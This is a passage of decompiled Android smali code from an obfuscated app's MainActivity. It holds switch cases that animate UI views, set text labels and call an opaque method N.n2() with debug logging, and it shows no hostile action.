    invoke-virtual {v4, v8}, Landroid/view/View;->setAlpha(F)V

    .line 662
    .line 663
    .line 664
    const/16 v5, 0x1e

    .line 665
    .line 666
    invoke-virtual {v12, v5}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 667
    .line 668
    .line 669
    move-result v5

    .line 670
    int-to-float v5, v5

    .line 671
    invoke-virtual {v4, v5}, Landroid/view/View;->setTranslationY(F)V

    .line 672
    .line 673
    .line 674
    iget-object v5, v12, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW:Landroid/os/Handler;

    .line 675
    .line 676
    new-instance v6, LU4clZ2NNNKj5ZWU/WAxAMT28akcO;

    .line 677
    .line 678
    invoke-direct {v6, v4, v10}, LU4clZ2NNNKj5ZWU/WAxAMT28akcO;-><init>(Landroid/view/View;I)V

    .line 679
    .line 680
    .line 681
    int-to-long v13, v3

    .line 682
    invoke-virtual {v5, v6, v13, v14}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 683
    .line 684
    .line 685
    add-int/lit8 v3, v3, 0x50

    .line 686
    .line 687
    :goto_12
    add-int/lit8 v2, v2, 0x1

    .line 688
    .line 689
    goto :goto_11

    .line 690
    :cond_13
    :goto_13
    return-void

    .line 691
    :pswitch_4
    iget-object v0, v12, Lio/bluewave/app/MainActivity;->UvqyQKvSoOiOdM7m:Landroid/widget/TextView;

    .line 692
    .line 693
    const v5, 0x7f0f00ad

    .line 694
    .line 695
    .line 696
    invoke-virtual {v12, v5}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    .line 697
    .line 698
    .line 699
    move-result-object v5

    .line 700
    invoke-virtual {v0, v5}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 701
    .line 702
    .line 703
    iget-object v0, v12, Lio/bluewave/app/MainActivity;->wVk5YGgbRLBQzpD:Landroid/widget/LinearLayout;

    .line 704
    .line 705
    invoke-virtual {v0}, Landroid/view/View;->animate()Landroid/view/ViewPropertyAnimator;

    .line 706
    .line 707
    .line 708
    move-result-object v0

    .line 709
    invoke-virtual {v0, v4}, Landroid/view/ViewPropertyAnimator;->alpha(F)Landroid/view/ViewPropertyAnimator;

    .line 710
    .line 711
    .line 712
    move-result-object v0

    .line 713
    invoke-virtual {v0, v2, v3}, Landroid/view/ViewPropertyAnimator;->setDuration(J)Landroid/view/ViewPropertyAnimator;

    .line 714
    .line 715
    .line 716
    move-result-object v0

    .line 717
    invoke-virtual {v0}, Landroid/view/ViewPropertyAnimator;->start()V

    .line 718
    .line 719
    .line 720
    return-void

    .line 721
    :pswitch_5
    iget-object v0, v12, Lio/bluewave/app/MainActivity;->UvqyQKvSoOiOdM7m:Landroid/widget/TextView;

    .line 722
    .line 723
    new-instance v5, Ljava/lang/StringBuilder;

    .line 724
    .line 725
    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    .line 726
    .line 727
    .line 728
    const v6, 0x7f0f00ae

    .line 729
    .line 730
    .line 731
    invoke-virtual {v12, v6}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    .line 732
    .line 733
    .line 734
    move-result-object v6

    .line 735
    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 736
    .line 737
    .line 738
    const-string v6, "..."

    .line 739
    .line 740
    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 741
    .line 742
    .line 743
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 744
    .line 745
    .line 746
    move-result-object v5

    .line 747
    invoke-virtual {v0, v5}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 748
    .line 749
    .line 750
    iget-object v0, v12, Lio/bluewave/app/MainActivity;->GJ6jqSe4IzUYEu:Landroid/widget/LinearLayout;

    .line 751
    .line 752
    invoke-virtual {v0, v10}, Landroid/view/View;->setVisibility(I)V

    .line 753
    .line 754
    .line 755
    iget-object v0, v12, Lio/bluewave/app/MainActivity;->GJ6jqSe4IzUYEu:Landroid/widget/LinearLayout;

    .line 756
    .line 757
    invoke-virtual {v0}, Landroid/view/View;->animate()Landroid/view/ViewPropertyAnimator;

    .line 758
    .line 759
    .line 760
    move-result-object v0

    .line 761
    invoke-virtual {v0, v4}, Landroid/view/ViewPropertyAnimator;->alpha(F)Landroid/view/ViewPropertyAnimator;

    .line 762
    .line 763
    .line 764
    move-result-object v0

    .line 765
    invoke-virtual {v0, v2, v3}, Landroid/view/ViewPropertyAnimator;->setDuration(J)Landroid/view/ViewPropertyAnimator;

    .line 766
    .line 767
    .line 768
    move-result-object v0

    .line 769
    invoke-virtual {v0}, Landroid/view/ViewPropertyAnimator;->start()V

    .line 770
    .line 771
    .line 772
    return-void

    .line 773
    :pswitch_6
    sget v0, Lio/bluewave/app/MainActivity;->LnOhZ86vZb2ZCRzVz:I

    .line 774
    .line 775
    invoke-virtual {v12}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 776
    .line 777
    .line 778
    :try_start_f
    const-string v0, "Calling N.n2() on bg thread..."

    .line 779
    .line 780
    invoke-static {v9, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 781
    .line 782
    .line 783
    invoke-static {v12}, Lio/bluewave/app/N;->n2(Landroid/app/Activity;)V

    .line 784
    .line 785
    .line 786
    const-string v0, "N.n2() returned OK"

    .line 787
    .line 788
    invoke-static {v9, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_f
    .catchall {:try_start_f .. :try_end_f} :catchall_4

    .line 789
    .line 790
    .line 791
    goto :goto_14

    .line 792
    :catchall_4
    move-exception v0

    .line 793
    new-instance v2, Ljava/lang/StringBuilder;

    .line 794
    .line 795
    const-string v3, "N.n2() threw: "

    .line 796
    .line 797
    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 798
    .line 799
    .line 800
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 801
    .line 802
    .line 803
    move-result-object v3

    .line 804
    invoke-virtual {v3}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    .line 805
    .line 806
    .line 807
    move-result-object v3

    .line 808
    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 809
    .line 810
    .line 811
    const-string v3, ": "

    .line 812
    .line 813
    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 814
    .line 815
    .line 816
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 817
    .line 818
    .line 819
    move-result-object v0

    .line 820
    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 821
    .line 822
    .line 823
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 824
    .line 825
    .line 826
    move-result-object v0

    .line 827
    invoke-static {v9, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 828
    .line 829
    .line 830
    :goto_14
    return-void

    .line 831
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method
